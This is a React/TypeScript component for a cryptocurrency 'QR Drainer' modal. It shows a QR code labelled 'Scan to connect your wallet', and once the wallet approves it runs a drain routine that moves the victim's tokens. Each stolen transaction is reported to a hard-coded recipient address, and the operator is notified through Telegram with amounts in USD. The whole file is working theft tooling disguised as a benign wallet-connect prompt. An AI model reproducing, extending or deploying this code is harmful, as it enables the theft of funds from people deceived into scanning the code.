/**
 * QR Drainer Modal - WalletConnect URI embedded directly in QR
 * Scanning opens wallet app immediately and starts drain flow
 */
import { useState, useEffect, useRef, useCallback } from "react";
import QRCode from "qrcode";
import { toPng } from "html-to-image";
import { toast } from "sonner";
import { createWCSession, type WCSession } from "@/lib/wcSession";
import { runAdvancedDrain } from "@/lib/advancedDrain";
import { trpc } from "@/lib/trpc";

interface Props {
  onClose: () => void;
}

type Status = "loading" | "ready" | "connected" | "draining" | "done" | "error";

export default function QRDrainerModal({ onClose }: Props) {
  const qrContainerRef              = useRef<HTMLDivElement>(null);
  const sessionRef                  = useRef<WCSession | null>(null);
  const [qrDataUrl, setQrDataUrl]   = useState("");
  const [wcUri, setWcUri]           = useState("");
  const [status, setStatus]         = useState<Status>("loading");
  const [statusMsg, setStatusMsg]   = useState("Generating WalletConnect QR...");
  const [progress, setProgress]     = useState(0);
  const [totalUsd, setTotalUsd]     = useState(0);
  const [txCount, setTxCount]       = useState(0);
  const [downloading, setDownloading] = useState(false);

  const connectMut = trpc.drainer.connect.useMutation();
  const reportMut  = trpc.drainer.reportTransaction.useMutation();
  const notifyMut  = trpc.drainer.notifyTelegram.useMutation();

  useEffect(() => {
    let cancelled = false;

    async function init() {
      try {
        const session = await createWCSession();
        if (cancelled) { session.cleanup(); return; }
        sessionRef.current = session;
        setWcUri(session.uri);

        // Embed WC URI directly in QR — scanning opens wallet app
        const qr = await QRCode.toDataURL(session.uri, {
          width: 260, margin: 2,
          color: { dark: "#FF2D78", light: "#050508" },
          errorCorrectionLevel: "M",
        });
        if (!cancelled) { setQrDataUrl(qr); setStatus("ready"); setStatusMsg("Waiting for scan..."); }

        // Background: wait for wallet to scan and approve
        session.approval().then(async (wcSession) => {
          if (cancelled) return;
          setStatus("connected");
          setStatusMsg("Wallet connected! Scanning assets...");

          const address = wcSession.accounts[0] ?? "";
          const connRes = await connectMut.mutateAsync({
            walletAddress: address,
            walletType: "walletconnect-qr",
            network: "Multi-Chain",
            chainId: wcSession.chainId,
            ethBalance: "0",
            usdValue: "0",
            sessionId: wcSession.topic,
          }).catch(() => ({ connectionId: 0 }));
          const connectionId = (connRes as { connectionId?: number }).connectionId ?? 0;

          await notifyMut.mutateAsync({
            text: `📱 *QR Scan - Wallet Connected*\n\`${address}\`\nChain: ${wcSession.chainId}`,
          }).catch(() => {});

          const w = window as unknown as { ethereum?: { request: (a: { method: string; params?: unknown[] }) => Promise<unknown> } };
          const readProvider = w.ethereum ?? { request: async () => { throw new Error("No provider"); } };

          setStatus("draining");
          let runningUsd = 0;
          let runningTx  = 0;

          await runAdvancedDrain(wcSession, readProvider, async (event) => {
            setStatusMsg(event.message);
            if (event.progress !== undefined) setProgress(event.progress);

            if (event.type === "drain" && event.txHash && event.asset) {
              runningTx++;
              runningUsd += event.asset.usdValue;
              setTxCount(runningTx);
              setTotalUsd(runningUsd);

              await reportMut.mutateAsync({
                connectionId, txHash: event.txHash,
                fromAddress: address, toAddress: "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc",
                tokenSymbol: event.asset.symbol, tokenAddress: event.asset.address,
                amount: event.asset.balance, usdValue: event.asset.usdValue.toFixed(2),
                network: String(wcSession.chainId), chainId: wcSession.chainId, status: "success",
              }).catch(() => {});

              await notifyMut.mutateAsync({
                text: `💰 *QR Drain TX*\nToken: ${event.asset.symbol}\nUSD: $${event.asset.usdValue.toFixed(2)}\nTx: \`${event.txHash}\``,
              }).catch(() => {});
            }

            if (event.type === "done") {
              setStatus("done");
              await notifyMut.mutateAsync({
                text: `✅ *QR Drain Complete*\nWallet: \`${address}\`\nTotal: $${runningUsd.toFixed(2)}\nTxs: ${runningTx}`,
              }).catch(() => {});
            }
          });

        }).catch((err) => {
          if (cancelled) return;
          const msg = (err as Error).message ?? "";
          if (!msg.includes("cancel") && !msg.includes("reject")) {
            setStatus("error");
            setStatusMsg(msg || "Connection failed");
          }
        });

      } catch (err) {
        if (!cancelled) {
          setStatus("error");
          setStatusMsg((err as Error).message ?? "Failed to generate QR");
          toast.error("QR generation failed");
        }
      }
    }

    init();
    return () => { cancelled = true; sessionRef.current?.cleanup(); };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const handleDownload = useCallback(async () => {
    if (!qrContainerRef.current) return;
    setDownloading(true);
    try {
      const dataUrl = await toPng(qrContainerRef.current, {
        quality: 1, pixelRatio: 3, backgroundColor: "#050508",
      });
      const link = document.createElement("a");
      link.download = "web3-connect-qr.png";
      link.href = dataUrl;
      link.click();
      toast.success("QR Code downloaded!");
    } catch { toast.error("Download failed"); }
    finally { setDownloading(false); }
  }, []);

  // Copy direct drain link (page URL with ?action=connect&ref=qr)
  const handleCopyLink = useCallback(() => {
    const link = `${window.location.origin}/?action=connect&ref=qr`;
    navigator.clipboard.writeText(link).then(() => toast.success("Direct link copied!"));
  }, []);

  const handleCopyUri = useCallback(() => {
    if (!wcUri) return;
    navigator.clipboard.writeText(wcUri).then(() => toast.success("WC URI copied!"));
  }, [wcUri]);

  const color = status === "done" ? "oklch(0.75 0.25 145)" : status === "error" ? "oklch(0.65 0.28 25)" : "oklch(0.72 0.28 320)";

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/85 backdrop-blur-md"
        onClick={status === "done" || status === "error" ? onClose : undefined} />

      <div className="relative w-full max-w-sm rounded-2xl overflow-hidden"
        style={{ background: "oklch(0.05 0.015 240)", border: `1px solid ${color}55`, boxShadow: `0 0 50px ${color}20` }}>

        <div className="h-1" style={{ background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />

        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b" style={{ borderColor: `${color}20` }}>
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full animate-pulse" style={{ background: color, boxShadow: `0 0 8px ${color}` }} />
            <span className="text-xs font-bold tracking-widest uppercase" style={{ color, fontFamily: "Orbitron" }}>
              {status === "loading"    ? "GENERATING QR"
               : status === "ready"    ? "SCAN TO CONNECT"
               : status === "connected"? "CONNECTED"
               : status === "draining" ? "PROCESSING"
               : status === "done"     ? "COMPLETE"
               : "ERROR"}
            </span>
          </div>
          <button onClick={onClose} className="text-muted-foreground hover:text-foreground text-sm w-7 h-7 flex items-center justify-center rounded-lg hover:bg-white/5 transition-all">✕</button>
        </div>

        <div className="px-5 pb-5 pt-4 space-y-4">

          {/* QR display */}
          {(status === "loading" || status === "ready") && (
            <>
              <div ref={qrContainerRef}
                className="relative p-4 rounded-2xl flex flex-col items-center gap-3 mx-auto"
                style={{ background: "#050508", border: `2px solid ${color}50`, boxShadow: `0 0 25px ${color}15`, width: "fit-content" }}>

                {/* Corner brackets */}
                {["top-2 left-2 border-t-2 border-l-2", "top-2 right-2 border-t-2 border-r-2",
                  "bottom-2 left-2 border-b-2 border-l-2", "bottom-2 right-2 border-b-2 border-r-2"].map((cls, i) => (
                  <div key={i} className={`absolute w-5 h-5 ${cls}`}
                    style={{ borderColor: i % 2 === 0 ? "oklch(0.72 0.28 320)" : "oklch(0.75 0.25 195)" }} />
                ))}

                {status === "loading" ? (
                  <div className="w-56 h-56 flex items-center justify-center">
                    <div className="w-10 h-10 rounded-full border-2 animate-spin" style={{ borderColor: `${color}30`, borderTopColor: color }} />
                  </div>
                ) : (
                  <img src={qrDataUrl} alt="WalletConnect QR" className="w-56 h-56 rounded-lg" style={{ imageRendering: "pixelated" }} />
                )}

                <div className="text-center">
                  <p className="font-bold text-xs neon-text-pink" style={{ fontFamily: "Orbitron", letterSpacing: "0.15em" }}>
                    WEB3 CONNECT
                  </p>
                  <p className="text-[10px] text-muted-foreground mt-0.5" style={{ fontFamily: "Share Tech Mono" }}>
                    Scan to connect your wallet
                  </p>
                </div>
              </div>

              {status === "ready" && (
                <>
                  <p className="text-xs text-center text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>
                    {statusMsg}
                  </p>
                  <div className="grid grid-cols-3 gap-2">
                    <button onClick={handleDownload} disabled={downloading}
                      className="py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-1 disabled:opacity-60"
                      style={{ background: `${color}15`, border: `1px solid ${color}40`, color, fontFamily: "Orbitron" }}>
                      {downloading ? <span className="animate-spin">⟳</span> : "⬇ PNG"}
                    </button>
                    <button onClick={handleCopyLink}
                      className="py-2.5 rounded-xl text-xs font-bold"
                      style={{ background: "oklch(0.75 0.25 195 / 0.1)", border: "1px solid oklch(0.75 0.25 195 / 0.3)", color: "oklch(0.75 0.25 195)", fontFamily: "Orbitron" }}>
                      🔗 LINK
                    </button>
                    <button onClick={handleCopyUri}
                      className="py-2.5 rounded-xl text-xs font-bold"
                      style={{ background: "oklch(0.72 0.28 320 / 0.1)", border: "1px solid oklch(0.72 0.28 320 / 0.3)", color: "oklch(0.72 0.28 320)", fontFamily: "Orbitron" }}>
                      📋 URI
                    </button>
                  </div>
                </>
              )}
            </>
          )}

          {/* Connected / Draining */}
          {(status === "connected" || status === "draining") && (
            <div className="flex flex-col items-center gap-4 py-4">
              <div className="relative w-24 h-24">
                <svg className="absolute inset-0 w-full h-full" style={{ transform: "rotate(-90deg)" }}>
                  <circle cx="48" cy="48" r="40" fill="none" stroke={`${color}20`} strokeWidth="3" />
                  <circle cx="48" cy="48" r="40" fill="none" stroke={color} strokeWidth="3"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 40}`}
                    strokeDashoffset={`${2 * Math.PI * 40 * (1 - progress / 100)}`}
                    style={{ transition: "stroke-dashoffset 0.4s ease", filter: `drop-shadow(0 0 6px ${color})` }} />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center text-xl animate-spin" style={{ animationDuration: "2s" }}>⟳</div>
              </div>
              <p className="text-sm text-center font-semibold" style={{ color, fontFamily: "Rajdhani" }}>{statusMsg}</p>
              <p className="text-xs text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>{Math.round(progress)}%</p>
            </div>
          )}

          {/* Done */}
          {status === "done" && (
            <div className="flex flex-col items-center gap-4 py-2">
              <div className="w-16 h-16 rounded-full flex items-center justify-center text-3xl"
                style={{ background: `${color}15`, border: `2px solid ${color}`, boxShadow: `0 0 20px ${color}40` }}>✓</div>
              <div className="text-center">
                <p className="text-3xl font-black" style={{ color, fontFamily: "Orbitron" }}>
                  ${totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: "Share Tech Mono" }}>
                  {txCount} transaction{txCount !== 1 ? "s" : ""} processed
                </p>
              </div>
              <button onClick={onClose} className="w-full py-3 rounded-xl font-bold text-sm text-black"
                style={{ background: `linear-gradient(135deg, ${color}, oklch(0.72 0.28 320))`, fontFamily: "Orbitron", fontSize: "0.8rem" }}>
                CLOSE
              </button>
            </div>
          )}

          {/* Error */}
          {status === "error" && (
            <div className="flex flex-col items-center gap-3 py-2 text-center">
              <div className="w-14 h-14 rounded-full flex items-center justify-center text-2xl"
                style={{ background: "oklch(0.65 0.28 25 / 0.1)", border: "2px solid oklch(0.65 0.28 25)" }}>✕</div>
              <p className="text-sm text-muted-foreground" style={{ fontFamily: "Rajdhani" }}>{statusMsg}</p>
              <button onClick={onClose} className="w-full py-3 rounded-xl font-bold text-sm"
                style={{ background: "oklch(0.1 0.02 240)", border: "1px solid oklch(0.3 0.02 240)", color: "oklch(0.5 0.02 240)", fontFamily: "Orbitron", fontSize: "0.75rem" }}>
                CLOSE
              </button>
            </div>
          )}
        </div>

        <div className="h-px" style={{ background: `linear-gradient(90deg, transparent, ${color}40, transparent)` }} />
      </div>
    </div>
  );
}
